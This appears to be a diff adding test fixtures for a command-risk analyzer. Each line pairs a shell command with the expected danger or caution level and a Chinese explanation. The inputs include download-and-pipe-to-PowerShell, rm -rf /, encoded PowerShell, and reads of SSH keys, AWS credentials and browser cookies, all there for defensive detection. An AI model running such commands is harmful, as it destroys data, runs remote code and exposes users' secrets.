+{"fn":"analyzeCommand","args":["iwr",["http://a/b","|","powershell"]],"ok":{"level":"danger","findings":[{"rule":"shell-separator","reason":"命令里有命令分隔符（; & |）—— 它会串起多条命令，不止一条"},{"rule":"download-pipe","reason":"下载后直接管道执行 —— 远端内容会在你机器上直接跑"},{"rule":"windows-shell","reason":"调用了命令行解释器 —— 常见的藏命令手法"}]}}
+{"fn":"analyzeCommand","args":["Invoke-WebRequest",["http://a/b","|","pwsh"]],"ok":{"level":"danger","findings":[{"rule":"shell-separator","reason":"命令里有命令分隔符（; & |）—— 它会串起多条命令，不止一条"},{"rule":"download-pipe","reason":"下载后直接管道执行 —— 远端内容会在你机器上直接跑"},{"rule":"windows-shell","reason":"调用了命令行解释器 —— 常见的藏命令手法"}]}}
+{"fn":"analyzeCommand","args":["curl",["http://a/b","|","node"]],"ok":{"level":"danger","findings":[{"rule":"shell-separator","reason":"命令里有命令分隔符（; & |）—— 它会串起多条命令，不止一条"},{"rule":"download-pipe","reason":"下载后直接管道执行 —— 远端内容会在你机器上直接跑"}]}}
+{"fn":"analyzeCommand","args":["curl",["http://a/b","|"]],"ok":{"level":"danger","findings":[{"rule":"shell-separator","reason":"命令里有命令分隔符（; & |）—— 它会串起多条命令，不止一条"}]}}
+{"fn":"analyzeCommand","args":["curl",["http://a/b"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["node",["server.js"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["rm",["-rf","/"]],"ok":{"level":"danger","findings":[{"rule":"destructive-delete","reason":"递归删除 —— 可能删掉不该删的东西"}]}}
+{"fn":"analyzeCommand","args":["rm",["-rf","/tmp/x"]],"ok":{"level":"danger","findings":[{"rule":"destructive-delete","reason":"递归删除 —— 可能删掉不该删的东西"}]}}
+{"fn":"analyzeCommand","args":["rmdir",["/s","/q","C:\\Windows"]],"ok":{"level":"danger","findings":[{"rule":"destructive-delete","reason":"递归删除 —— 可能删掉不该删的东西"}]}}
+{"fn":"analyzeCommand","args":["Remove-Item",["-Recurse","C:\\Users"]],"ok":{"level":"danger","findings":[{"rule":"destructive-delete","reason":"递归删除 —— 可能删掉不该删的东西"}]}}
+{"fn":"analyzeCommand","args":["del",["/s","C:\\temp"]],"ok":{"level":"danger","findings":[{"rule":"destructive-delete","reason":"递归删除 —— 可能删掉不该删的东西"}]}}
+{"fn":"analyzeCommand","args":["sudo",["apt","install","curl"]],"ok":{"level":"danger","findings":[{"rule":"privilege-escalation","reason":"提权执行"}]}}
+{"fn":"analyzeCommand","args":["runas",["/user:admin"]],"ok":{"level":"danger","findings":[{"rule":"privilege-escalation","reason":"提权执行"}]}}
+{"fn":"analyzeCommand","args":["powershell",["-enc","ZQBjAGgAbwA="]],"ok":{"level":"danger","findings":[{"rule":"encoded-powershell","reason":"编码后的 PowerShell 命令 —— 真实内容被藏起来了"},{"rule":"windows-shell","reason":"调用了命令行解释器 —— 常见的藏命令手法"}]}}
+{"fn":"analyzeCommand","args":["powershell.exe",["-EncodedCommand","AA"]],"ok":{"level":"danger","findings":[{"rule":"encoded-powershell","reason":"编码后的 PowerShell 命令 —— 真实内容被藏起来了"},{"rule":"windows-shell","reason":"调用了命令行解释器 —— 常见的藏命令手法"}]}}
+{"fn":"analyzeCommand","args":["echo",["a",">","b"]],"ok":{"level":"caution","findings":[{"rule":"shell-redirect","reason":"命令里有重定向（< >）—— 它会读写文件"}]}}
+{"fn":"analyzeCommand","args":["cmd",["/c","dir"]],"ok":{"level":"caution","findings":[{"rule":"windows-shell","reason":"调用了命令行解释器 —— 常见的藏命令手法"}]}}
+{"fn":"analyzeCommand","args":["pwsh",["-File","x.ps1"]],"ok":{"level":"caution","findings":[{"rule":"windows-shell","reason":"调用了命令行解释器 —— 常见的藏命令手法"}]}}
+{"fn":"analyzeCommand","args":["cat",["~/.ssh/id_rsa"]],"ok":{"level":"caution","findings":[{"rule":"credential-access","reason":"碰到了凭据相关的路径"}]}}
+{"fn":"analyzeCommand","args":["cat",["C:\\Users\\x\\.aws\\credentials"]],"ok":{"level":"caution","findings":[{"rule":"credential-access","reason":"碰到了凭据相关的路径"}]}}
+{"fn":"analyzeCommand","args":["cat",["~/.kube/config"]],"ok":{"level":"caution","findings":[{"rule":"credential-access","reason":"碰到了凭据相关的路径"}]}}
+{"fn":"analyzeCommand","args":["cat",["C:\\Users\\x\\AppData\\Roaming\\SomeToken"]],"ok":{"level":"caution","findings":[{"rule":"credential-access","reason":"碰到了凭据相关的路径"}]}}
+{"fn":"analyzeCommand","args":["cat",["cookies.sqlite"]],"ok":{"level":"caution","findings":[{"rule":"credential-access","reason":"碰到了凭据相关的路径"}]}}
+{"fn":"analyzeCommand","args":["cat",[".git-credentials"]],"ok":{"level":"caution","findings":[{"rule":"credential-access","reason":"碰到了凭据相关的路径"}]}}
+{"fn":"analyzeCommand","args":["chmod",["777","/tmp"]],"ok":{"level":"caution","findings":[{"rule":"permission-loosening","reason":"放宽了文件权限"}]}}
+{"fn":"analyzeCommand","args":["chmod",["-R","a+rwx","/tmp"]],"ok":{"level":"caution","findings":[{"rule":"permission-loosening","reason":"放宽了文件权限"}]}}
+{"fn":"analyzeCommand","args":["icacls",["C:\\x","/grant","Everyone:F"]],"ok":{"level":"caution","findings":[{"rule":"permission-loosening","reason":"放宽了文件权限"}]}}
+{"fn":"analyzeCommand","args":["npm",["install","--force"]],"ok":{"level":"caution","findings":[{"rule":"package-install","reason":"强制安装依赖 —— 可能覆盖已有包"}]}}
+{"fn":"analyzeCommand","args":["npm",["i","-f"]],"ok":{"level":"caution","findings":[{"rule":"package-install","reason":"强制安装依赖 —— 可能覆盖已有包"}]}}
+{"fn":"analyzeCommand","args":["pip",["install","--break-system-packages","x"]],"ok":{"level":"caution","findings":[{"rule":"package-install","reason":"强制安装依赖 —— 可能覆盖已有包"}]}}
+{"fn":"analyzeCommand","args":["echo",["hello"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["",[]],"ok":{"level":"none","findings":[]}}
